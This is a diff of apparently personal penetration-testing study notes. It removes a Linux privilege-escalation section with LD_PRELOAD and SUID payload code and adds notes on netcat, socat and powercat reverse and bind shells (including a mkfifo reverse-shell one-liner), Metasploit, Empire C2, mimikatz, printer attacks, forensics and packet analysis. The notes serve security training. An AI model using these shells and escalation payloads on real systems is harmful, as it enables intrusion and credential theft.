@@ -1,232 +1,517 @@
-Linux Privesc:
-=============
-Baiscs: see linux important commands
-different types of shell in linux:
-	/bin/sh:
-		terminal>#
-		/bin/sh is an executable representing the system shell and usually implemented as a symbolic link pointing to the executable for whichever shell is the system shell. The system shell is basically the default shell that the script should use. In last couple of years, Debian (and Ubuntu) decided to switch the system shell from bash to dash — a similar shell but lighter and much faster.
-	/bin/bash:
-		user@host:/dir$
-		/bin/bash is the most common shell used as default shell for user login of the linux system. The shell’s name is an acronym for Bourne-again shell.
-	dash:
-		Dash is fairly well compatible with bash, being based on the same POSIX standard.
-	rbash:
-		Restricted Bash
-	bash:
+Exploitation:
+============
+Shells:
+	Netcat:
+		it works for both TCP and UDP
+		It has two modes:
+			Client mode:
+			 	to connect to ip:port
+			Server mode:
+				to listen on a port
+		connecting to a port/banner grabbing:(client Mode)
+			nc -nv ip port 
+		listening on a port:(server mode)
+			nc -nvlp port
+		file transfer:
+			it can happen in both text and binary mode
+			reciver:(server mode)
+				nc -nvlp port > incoming.exe
+			sender:(client mode)
+				nc -nv reciever_ip port < wget.exe
+		Remote administration:
+			bind shell:
+				Attacker:(client)
+					nc victim_ip 4444
+					here, we are connecting to victim, ie, we initiates the connection
+				victim:(server)
+					nc -nvlp 4444 -e cmd.exe
+					victim listens
+			reverse shell:
+				Attacker:(server)
+					nc -nvlp 4444
+					here, we are listening
+				victim:(client)
+					nc -nv attacker_ip port -e cmd.exe
+					here, victim connects to us, ie, victim initiates the connection
+		options:
+			-n => skip DNS name resolution
+			-v => verbose
+			-l => listen
+			-p => port no
+			-e => execute
+				cmd.exe => for windows
+				powershell.exe => powershell
+				/bin/bash => for linux
+		Most times, in victim, nc is available, but it dont support -e option sometimes, then:
+			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+	Socat:
+		Why to use?
+			1. some boxes may have socat instead of Netcat
+			2. SSL-Encrypted bind shells
+		Connecting to a port:(banner grabbing)
+			socat - TCP4:ip:port 
+		Setting up a listener:
+			socat TCP4-LISTEN:port STDOUT
+		Transfering files:
+			Sender:(listener)
+				socat TCP4-LISTEN:port,fork file:filename.exe
+			Reciever:
+				socat TCP4:sender_ip:port file:filename.exe,create
+		Remote administration:
+			bind shell:(ENCRYPTED)
+				Encryption:
+					for this, we use ssl cert:
+						openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out cert.crt
+							req => iniate a new cert signing request
+							-newkey => generate a new private key
+							rsa:2048 => use RSA 2048 bit encryption
+							-nodes => store private key without passphrase protection
+							-keyout => save key to a file
+							-x509 => output a self signed certificate
+							-days => vailidity in days
+						we will get two files: 
+							cert.key 
+							cert.crt
+						cat cert.key cert.crt > cert.pem
+				Attacker:(client)
+					socat - OPENSSL:attacker_ip:443,verify=0
+				victim:(server)
+					socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash
+					verify=0 => disable ssl cert verification
+			reverse shell:
+				Attacker:(server)
+					socat -d -d TCP4-LISTEN:port STDOUT
+					here, we are listening
+				victim:(client)
+					socat TCP4:victim_ip:port EXEC:/bin/bash 
+					here, victim connects to us, ie, victim initiates the connection	
+		Options:
+			- => to transfer data b/w STDIO(Standard input-output) and remote host
+			OPENSSL-LISTEN => to create the listener on port 443
+			verify=0 => to disable SSL verification
+			fork => creates a child process once a Connection is made to listener+
+			-d -d => verbose
+			create => specifies that a new file will be created
+			STDOUT => to connect standard output (STDOUT) to the TCP socket
+			EXEC: => same as -e of netcat
+	Powercat:(Netcat for powershell)
+		Installation:
+			kali> apt-get install powercat
+			it will install scripts in /usr/share/windows-resources/powercat
+			transfer powercat.ps1 to windows
+		File transfer:
+			1kali:
+				nc -nvlp 443 > a.ps1 => reciever
+			windows:
+				powercat -c attacker_ip -p 443 -i C:\Users\Offsec\powercat.ps1 => sender
+		Bind shell:
+			Attacker:(client)
+				nc victim_ip 443
+			Windows:(server)
+				powercat -l -p 443 -e cmd.exe
+		Reverse shell:
+			Attacker:(server)
+				nc -nvlp 443
+			windows:(client)
+				powercat -c 10.11.0.4 -p 443 -e cmd.exe
 	Note:
-		While going from lower shell to higher shell (user to root)
-		if ssh doesnt work:
-			lower_shell> su root
-Basic enumeration:
-	sytem enum:
-		uname -a
-		cat /proc/version => same as uname
-		lscpu => tell arch
-		ps -aux => process
-		sudo -v => tells sudo version
-	user enum:
-		cat /etc/passwd => see all users
-			anyone can access this file
-		history
-			always see history, we may find some juicy info
-		cat .bash_history
-	network enum:
-		ip a => same as ifconfig
-		ip route => routing table
-		ip neigh => arp table
-		netstat -ano => show which ports are open
-Automated Tools:
-	linpeas.sh => better as it has colors
-	linenum.sh => same as linpeas.sh
-	linux-exploit-suggester.sh => CVE's
-	linuxprivchecker.py => CVE's
-	running any script in linux:
-		chmod +x script.ext
-		./script.ext
-Kernel Exploitation:
-	github.com/lucyoa/kernel-exploits
-	famous:
-		dirtycow
-	converting code from .c to obj:
-		gcc -pthread cow.c -o cow	
-Passwords and file permissions:
-	Password hunting:
-		grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
-			it will look for "PASSWORD=" in all files
-		find / -type f -iname "PASS*" 2> /dev/null
-		for ssh keys:
-			find / -type f -name id_rsa 2> /dev/null
-			find / -type f -name authorized_keys 2> /dev/null
-	Shadow password cracking:
-		basics:
-			/etc/passwd:
-				it contains no password
-				anyone can read it
-				it tells us what users are on a machine
-			/etc/passwd:
-				contains password in form of SHA-512 hash
-			relation between the two:
-				passwd: root:x:-----------
-				shadow: root:hash
-				now, the 'x' is a placeholder the hash of root
-		unshadow passwd shadow
-			passwd => /etc/passwd
-			shadow => /etc/shadow
-			it gives a SHA-512 file containg hash which can be cracked later on using hashcat or john
-			hashcat -m 1800 hash rockyou.txt
-	if we have RW access to shadow:
-		we can remove 'x' from passwd file, and root becomes passwordless
-		exchange hash from shadow file to a hash which we know => password changed
-		change id to 0 of our user => we become root
-sudo -l:
-	it shows which files/binaries can be run on behalf of Super Users(like root) without providing password
-	/etc/sudoers file:
-		it contains the text which sudo -l shows
-	to run sudo on behalf of any user other than root:
-		sudo -u toor command
-	sudo shell escape:
-		most of the files shown are binaries
-		whenever we see binaries => gtfobins.github.io
-	escalation via intended functionality:
-		sometimes, we may not have exploitation path for binaries shown according to gtfobins.
-		But, we may have some functionality of binaries, which can be exploited
-		google => file_name sudo privilege escalation
-	escaltion via LD_PRELOAD:
-		LD => Dynamic Linker
-		PreLoading => its a property of LD, it means we can load our own library before loading anything else.
-		detection:
-			sudo -l
-				env_keep+=LD_PRELOAD
-				NOPASSWD apache2 (or any binary)
-		Exploitation:
-			making malc library(.so file): 
-				shell.c:
-					#include <stdio.h>
-					#include <sys/types.h>
-					#include <stdlib.h>
-					void _init(){
-						unsetenv("LD_PRELOAD");
-						setgid(0);
-						setuid(0);
-						system("/bin/bash");
-					}
-					explanation:
-						unsetenv("LD_PRELOAD") => unset env variable "LD_PRELOAD"
-						setgid(0) => gid of root is 0
-						setuid(0) => uid of root is 0
-						system("/bin/bash") => excute /bin/bash
-				gcc -fpic -shared -o shell.so shell.c -nostartfile
-					fpic => Position Independent Code
-						it means regardless of from where shell addressing is, its going to function
-			sudo LD_PRELOAD=/home/user/shell.so apache2
-	CVE-2019-14287:
-		we can bypass restriction of using "sudo /bin/bash" by using "sudo -u#-1 /bin/bash"
-		requirements:
-			/etc/sudoers.tmp or sudo -l should have this line:
-				username ALL=(ALL, !root)
-	CVE-2019-18634:
-		requirements:
-			sudo version < 1.8.26
-			pwnfeedback should be enabled, how to check it:
-				sudo -l 
-				cat /etc/sudoers
-				sudo su root
-					type anything afterwars, it will be written as *****
-		exploitation:
-			github -> saleemrahid -> CVE-2019-18634
-SUID:(Set owner User ID upon execution):
-	find / -type f -perm -u=s 2> /dev/null
-	SUID privesc via Shared Object Injection:(SO Injection)
+		we need sudo permissions to bind a port below 1024
+		having shell at port 53 is nice as no firewall blocks port 53 as its DNS
+moving netcat shell to msfconsole:
+	manual method:
+		make a payload
+		upload payload to victim
+		start listener on msfconsole
+		execute payload in victim
+	automated method:(msf)
+		use exploit/multi/script/web_delivery
+		set target accordingly
+			for windows => PSH (powershell)
+		set payload windows/meterpreter/reverse_tcp
+		set lhost tun0
+		set srvhost tun0
+		run
+		it will give a cmd oneliner, run it in netcat shell
+Searchsploit:
+	searchsploit --id <ms/cve number> => search exploits by their ms/cve number
+	searchsploit -x number.py => to see
+	searchsploit -m number.py => to copy 
+msfconsole:
+	Basics:
+		sessions -i <id> => interact with selected session
+		sessions  => show active sessions
+		sessions -k <id> => kill the specifies session
+		ctrl + z => send the current session to background
+		exploit -j => open the session in background
+		session -u <id> => convert "shell" session into meterpreter
+	issues with shell:
+		shell is created but it dies:
+			maybe port is getting blocked by firewall
+			maybe we need to use change our payload ( staged to unstaged and vice-versa)
+			change payload to generic/shell_reverse_tcp
+		exploit run, no session created:
+		Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied:
+			we need to migrate
+	some nice modules(misc):
+		post/windows/manage/enable_rdp => enables rdp(windows)
+		post/windows/gather/enum_patches => hotfixes(windows)
+		windows/shell_reverse_tcp => to use netcat instead of meterpreter
+		windows/powershell_reverse_tcp => gives powershell in netcat
+		windows/exec CMD="command" => it will execute command 
+	setting up a listener:
+		use exploit/multi/handler
+		set payload
+	RC(Resource Scripts):
+		msfconsole -r shell.rc
+		it increases efficency as a .rc script has values like LHOST/LPORT already present.
+	Enable Logging:
+		log every command from msfconsole CLI in /root/msf_console.log
+		echo "spool /root/msf_console.log" /root/.msf5/msfconsole.rc
+Meterpreter commands:
+	sysinfo => system info
+	getuid => whoami
+	getprivs => show privileges
+	shell => give a cmd/bash shell
+	ps => show processes
+	hashdump => dump SAM/shadow hashes
+	getsystem => attempt privilege escalation
+	upload path/filename => helps to upload files(privesc)
+	run getgui -u loneferret -p password => get rdesktop
+	migration: changing pid (process id)
+		ps => shows processes
+		migrate <pid> => to change pid
+		Note: if we change our pid to pid of a process running under the name of more privileged user, it increases the privileges available to us
+	extensions:
+		load  <extension_name>
+		help => to see options avilable with an extension
+		load incognito: allows to impersonate user tokens
+			>list_tokens -u
+			>impersonate_token "token_name"
+		load kiwi: kiwi is new version of mimikitaz
+		load powershell	
+msfvenom:
+	general commands:
+		-p => payload 
+		-f => ouput format
+		-a => architecture(x64|x86)
+		-o => output file
+		-e => encoder
+		-i => The number of times to encode the payload
+		--platform => cisco/osx/freebsd/python/windows
+		-b => bad characters
+		--list x => where x= payloads/encoders/........
+		-v => variable name (see in "tyes of formats")
+		-n => NOPs
+		-x or –template => it is used to an executable as a template when creating Payload.
+		-k, or –keep => it is used in conjunction with -x to preserve the template’s normal behaviour by having the  injected payload run as a separate thread.
+	payloads basics:
+		staged:
+			sends payload in stages.
+			less stable
+			windows/meterpreter/reverse_tcp
+		non-staged:
+			sends shellcode all at once
+			it is larger in size, so it dont work always
+			windows/meterpreter_reverse_tcp
+Getting a more user frienly shell:
+	To use arrow buttons:
+		rlwrap -r nc -nlvp 4444
+	Getting a TTY Shell on Linux:
+		python -c 'import pty; pty.spawn("/bin/sh")'
+			if python not found:(we use python3 then)
+				python3 -c 'import pty; pty.spawn("/bin/sh")'
+	To use commands like "clear" in linux:
+		we need to declare screen variable
+		kali> env => search for screen variable name
+		shell>export TERM=variable_name
+Compiling Exploits:
+	mingw32:
+		apt-get install gcc_mingw-w64
+		x86-64_w64-mingw32-gcc file.c file.exe
+	gcc:
+		gcc main.c
+		gcc main.c -o file => save output as file
+		gcc -S main.c -o main.s	=> output in assembly language
+Empire:(PowerShell post-exploitation framework)
+	Important Files:
+		./Setup/install.sh => install all dependencies
+		./empire => run empire
+	Listener:(like handler of MSF)
+		its the first thing to do
+		types of listeners:
+			dbx listener:(Dropbox listener)
+				Its used to target networks which allow Dropbox connections. In this listener, the attacker network is never revealed to the victim.
+			http_com listener:
+				HTTPS listener that uses a GET/POST approach using a hidden Internet Explorer COM(Component Object Model) object
+			https_hop:
+				Its used to redirect traffic to another active listener immediately after getting an agent, its useful when we already have a listener and we want the new traffic to go to that listener instead of starting a new listener
+			http_foreign:
+				Used when you have a second Empire C2 server and you want to pass your new sessions to that server. we need to set host and staging key information
+			http listener:
+				simple HTTP listener which listens on port 80 by default
+			meterpreter listener: 
+		listener => shows active listeners
+		uselistener <type> => create listner
+		execute => start listener
+	Creating a LAUNCHER:
+		First create a listener
+		(Empire: Listerners) > launcher <language> <listener_name>
+			it will create a powershell one-liner, just execute this one-liner in target
+		language:
+			powershell
+	Stager:(like payload of MSF)
+		This is what actually executs on target to establish control with listener.
+		usestager <type>
+		info => it will show options
+			set listener <listener_name>
+		execute or generate => creates payload in my_system/tmp	
+			we will need to transfer that payload to target
+			target>./payload
+	Agents:(active shells)
+		agents => this will enter us into agent menu
+		rename <agent_name> <new_name> => to rename the agent
+		list => list agents
+		list stale => list agents which died
+		remove stale
+		interact agent_name => interact with agent
+			info => basic info of target
+			shell <command> => run command
+			rename new_name => to rename the agent		
+			creds => show gathered or manually entered creds
+				creds export /creds.csv
+				creds <user_name> => show creds related to a user_name only
+				creds plaintext
+				creds hash
+				creds add <domain> <user> <pass> => add creds manually
+				creds remove cred_id
+			sleep => to deactivate the agent for some time to avoid detection
+			kill => kill agent
+			upload 
+			download
+			mimikitaz => load mimikitaz	
+	Modules:
+		some nice modules:
+			powershell/credentials/mimikatz/lsadump
+			powershell/management/enable_rdp
+			powershell/management/psinject => migrate process
+		searchmodule privesc => search modules for privesc
+		usemodule name => use module
+			execute => execute module
+	Common Commands:
+		options or info => show options
+		set => change value of options
+		unset => remove value of options
+		back => return to previous menu
+Printer Exploitation:
+	Basics:
+		MFP(Multi Function Printer)
+			Its provides functions of multiple devices such as a fax, email, photocopier, scanner and printer.
+			Its used in home/small/large scale business A typical MFP is a mixture of various devices.
+			MFPs contain many features:
+				SDK(Software Development Kit)
+				LCD panels with optical mouse and keyboard attachments
+				WiFi
+				HDD
+				AD
+				SNMP/SMTP
+				editing and security of scanned documents
+				cordless phone
+			Types of MFP:
+				Inkjet: 
+				Laser:
+			Internal Architecture:
+				Hardware:
+					RAM, Processor, Digital Photocopier, storage memory- Flash memory or hard drive.
+				Software:
+					Firmware/OS
+			Authentication via credentials or RFID key, fingerprint, swipe card, "LDAP" is required to access the device 
+		Network Printer:
+			Printer connected to a network either via ethernet/Wifi
+			Network printers can be accessed either by:
+				DHCP(Dynamic Host Configuration Protocol) Server
+				Static Network Addressing
+		Non-network Printer:
+			Printer connected to network using USB or PARALLEL ports on the server
+		Printer Protocols:
+			SMB
+			IPP:(Internet Printing Protocol)(TCP/631)
+				Its for communication b/w client devices and printers. It allows clients to submit one or more print jobs to the printer, and perform tasks such as querying the status of a printer/print jobs, or canceling print jobs
+				if its open to the internet, it can used by anyone to print to the printer or transfer malicious data through it
+			LPD:(Line Printer Daemon)(TCP/515)
+			raw port 9100 
+		Printer Job Control Languages:
+			It not only manages settings like output trays for the current print jobs but' also the device as a whole.
+			SNMP:
+			PJL:(Printer Job Language)
+				Introduced by HP 
+				can be used to make permanent changes
+			PML:(Printer Management Language)
+				Its a proprietary language to control HP printers. 
+				It combines the features of SNMP with PJL.
+		Page Description Languages:(PDL)
+			It specifies the appearance of the actual document.
+			PS:(PostScript)
+				Introduced by Adobe
+				can handle both documents and graphics
+				malicious work:
+					DOS attack(by infinity loop)
+					print job manipulation
+					gaining access to printer's file system
+			PCL:
+				Its a standard for printers
+				not used in exploitation
+	Active Scanning:
+		Nmap:
+			normal and UDP scan
+		SNMP:
+		port 9100:
+			http://printer_ip:9100
+			it will not lead to any location but it reads a print job.
+		port 9100 over SSL:
+			https://printer_ip:9100
+			gives access to the LCD display, through which the attacker enters. 
+	PRET:(github)
+		issue => python2
+		./pret.py => scan local network for printers
+			better then nmap as it takes less time
+		./pret/py ip {pjl|ps|pcl}
+			it will allow us to interact with printer using cli
+		for other commands:
+			http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
+running samba on kali:
+	impacket-smbserver: it canne both used as a uploader or reciver
+		impacket-smbserver share_name `pwd`
+Forensics:
+	voltality:(tool to anayalze memory_dump(.dmp))
+		voltality -f abcd.dmp imageinfo
+			it will give some basic info
+			it will also give a list of profiles, we need to chose best one
+		voltality -d abcd.dmp --profile <profile> pstree
+			it will shows all process
+		voltality -d abcd.dmp --profile <profile> hashdump
+			it will give all hashes
+Steganography:
+	xxd:
+		aka hexviewer/hexdump
+		shows hex values for a file
+	exiftool:(apt-get install exiftool)
+		a tool for seeing metadata
+		exiftool file_name => general metadata
+	steghide:(apt-get install steghide)
+		used in jpeg only, ie, when jpeg, use this tool
+		here we have passphrase to hide or extract dta
+		it has 2 modes:
+			1. embed => to embed data (to hide data)
+			2. extract => to extract hidden data
+		flags:
+			-ef => file to be embedded
+			-cf => file to embed into 
+			-sf => stegofile, file which contains hidden data
+			-xf => extractfile, file in which to extract data
+			-p => passphrase
+			-z x => compression 
+				used when hiding text files
+				x=1 => fastest compression
+				x=9 => best compression
+			-Z => dont compress
+			-e => algorithm name, example des
+			--encinfo => to list all available algorithms
+		steghide embed -ef pass.txt -cf image.jpeg
+		steghide extract -sf image.jpg -xf data.txt
+		steghide info image.jpeg => to see if a file contains hidden data or not
+	zsteg:(gem install zsteg)
+		used for PNG and BMP (mostly PNG)
+		imgaedata:
+			example: b1,rgb,msb,xy (a.k.a payload used to encrpyt data)
+		zsteg image.png => identifies hidden file and gives image_data
+		zsteg -E "image_data" file.png > hidden.txt
+	sonic visualizer:
+		use: Spectrogram stegonography is the art of hiding hidden an image inside in an audio file's spectogram. Therefore when ever dealing with audio stego it is always worth analyzing the spectrogram of the audio. To do this task we use sonic Visualizer.
+		open a file and then layer -> add spectogram
+	binwalk:
+		uses:
+			main use => signature scanning
+			it is used when we have embedded files into some other file
+			-it is also use in Firmware Analysis
+		binwalk file.extension
+		binwalk -e file.extension => to extract the embedded files
+		binwalk file1 file2 => diff b/w two files
+		binwalk -b file.extension => signature analysis
+Packet Analysis:
+	Why do we do packet analysis:
+		1. Useful in scenario of a cyber attack, using tcpdump and awk/sed, we can find from which ip the attack was happening
+		2. When we wanna capture traffic over an interface
+	Wireshark:(Graphical)
 		Basics:
-			A Shared Object(.so) file is a library file which is linked to the executable/binary during runtime
-			Here, we inject into a .so file to exploit the executable/binary which may help escalate our privileges, provided that the executable/binary is a SUID file.
-		Exploitation:
-			malc.c:
-				#include<stdio.h>
-				#include<stdlib.h>
-				static void inject() __attribute__((constructor));
-				void inject(){
-					system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash -p");
-				}
-			gcc -shared -gpic -o malc.so malc.c
-			now, we place malc.so at a place from where the vulnerable binary can access it
-		Note:
-			TCM has a video on it in linux privesc course.
-	SUID privesc via Binary SYMLINKS:(CVE-2016-1247)
-		this is a vuln for nginx HTTP proxy webserver
-		vuln:
-			persmission of logs generated by nginx
-		SYMLINK:(Symobolic Link)
-			a file that contains reference to another files/dir in form of relative/absolute path
-		exploit -> github
-	SUID privesc via environment variables:
-		lets say we have a SUID file, but we cant exploit it.
-		So, we analyse it using grep and We may find that the file is calling other files/binaries
-		when some file is called from a file, it has either absolute path or relative path.
-			absolute path => /tmp/hello.so 
-			relative path => hello.so
-				in this case "environment variables come in play"
-		Via Absolute Path:
-			In such case, we make a malicious function with same name
-			exploitation:	
-				function /di1/dir2/service_name() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
-					explanation:
-						function => make a function
-						copies /bin/bash to /tmp/bash and makes /tmp/bash a SUID and then executes /tmp/bash
-				export -f /dir1/dir2/service
-				now run the SUID and boom
-		Via relative PATH:
-			Lets say we saw inside a SUID file "service apache2 start". Service is a binary file. its relative path is given. So we can exploit the 'Service' file
-			exploitation:
-				echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/service.c
-					explanation:
-						setgid(0) => gid of root is 0
-						setuid(0) => uid of root is 0
-						system("/bin/bash") => excute /bin/bash
-				gcc /tmp/service.c -o service
-				explort PATH=/tmp:$PATH
-				run the suid file and we are now root
-Capabilities:
-Schdeuled Tasks:
-	Two types:
-		cron jobs:
-			cat /etc/crontab => record of every cron job
-				if we see all **** => job is running every minute
-		systemd timers:
-			systemctl list-timers --all
-	escalation via cron file overwrite:
-		we see a file in /etc/crontab which can be modified by us (ie RW) permission, then we can modify that file to gain ROOT
-	escalation via cronpaths:
-		understanding cronpath:
-			PATH=/home/user:/sbin/local/:------
-			to run a file, it will 1st look in /home/user then in /sbin/local
-		if we find a file running every minute by root, we can modify it looking at our path
-Wildcards in TAR:
-	suppose we found a file which is either cron/SUID/etc and it has a statement like:
-		tar czf /usr/------/x.ext * (only wildcard amtters)
-	exploitation:
-		echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
-		touch /home/user/--checkpoint=1 (provide full path)
-		touch /home/user/--checkpoint-action=exec=sh\runme.sh
-		/tmp/bash -p => we are root now
-NFS Root Squashing:
-	NFS => netwrok file shares
-	cat /etc/exports
-		if we see a line like this:
-			/dir*(----,no_root_squash)
-		it means that /dir is shareable and can be mounted. it also means any changes made to it while being mounted are done as ROOT
-	kali:
-		showmount -e <ip> => it will show shares offered by an ip
-		mkdir /tmp/mount
-		mount -o rw,vers=2 <ip>:/dir /tmp/mount
-		now we can some changes in it, to exploit it	
-File transfers:
-	upload:
-		python3 -m http.server 80
-		python3 -m http.server 80 --dir /home/kali/tools
-		python2 -m SimpleHTTPServer 80
-			note: python2 support is discontinued in kali 2020.1
-	Download:
-		wget
-		axel
-		curl
+			Its good for capturing data
+			Working:
+				Network -> Capture Filters -> Capture Engine -> Display Filters
+			capture file: 
+				.pcap
+				.pcapng(pcap nextgen)
+			shortcuts:
+				shift + tab => to toggle between 3 differet windows
+				ctrl + f => find packet
+		Capture Filters:
+			select the network interface
+			net 10.11.10.0/24 => to only capture traffic on the following address range
+			Capture Filters tells wireshark about what traffic to catch and what to pass
+		Display Filters:
+			Display Filters manage the display of packets
+			ip.src==<ip> => filter by source ip
+			ip.dst==<ip> => filter by destination ip
+			ip.addr==<ip> => 
+			<protocol name> => filter by protocol name
+			http.request.method=='get' => filter by http method
+			tcp.port == <port> => filter by port number
+			conditions:
+				== or eq => equal to
+				|| => or
+				&& => and
+				!= => not equal to
+			examples:
+				ip.src == ip1 and ip.dst != ip2
+				tcp.port eq 25 or icmp
+		TCP streams:
+			The reassembled TCP stream is much easier to read
+			right click on any packet -> follow -> TCP stream
+	Tcpdump:(command line)
+		its good for reading .pcap files
+		tcpdump -i <interface> => capture all packets through given interface
+		tcpdump -i eth0 <protocol> => capture packets only of the specified protocol
+		tcpdump -i eth0 port 20
+		tcpdump -i eth0 port 20 and dst host 192.168.0.128
+		options:
+			-i => interface
+			-D => Show available interfaces
+			-A => show packets in ASCII
+			-X => show packets in HEX and ASCII
+			-l => live capture
+			-s => specify size of packets(default => 65536 bytes)
+			-c <n> => capture only "n" packets
+			-w file => write packets in file
+			-r file => read packets from a file	
+			-n => it will convert ip address to DNS names (website)
+			-tttt => show packets with proper readable TIMESTAMP
+			-v, -vv, -vvv => verbose levels
+			port <no> => show packets passing through specified port
+			dst host <ip/port> => show packets which have the given DESTINATION ip/port
+			src host <ip/port> => shows ackets which haven the given SOURCE ip/port
+			host <ip> => either source or detsination ip
+			net 1.2.3.0/24 => show packets filtered by network
+				keywords:
+					and
+					not
+					or
+				protocols:
+					fddi|tr|wlan|ip|ip6|arp|rarp|decnet|tcp|udp
+		Reading in ASCII and HEX:
+			it helps to understand traffic
+			tcmpdump -nX -r file.pcap
+		Advanced header filtering:
+			tcpdump 'header[byte #] == value'
+			TCP flag based filtering:
+				Basics:
+					Read 'TCP Flags' in networking sheet
+					tcp[13] => means 14th byte of tcp packet	as array indexing starts at 0
+				tcpdump 'tcp[13] = 24' => ACK and PSH
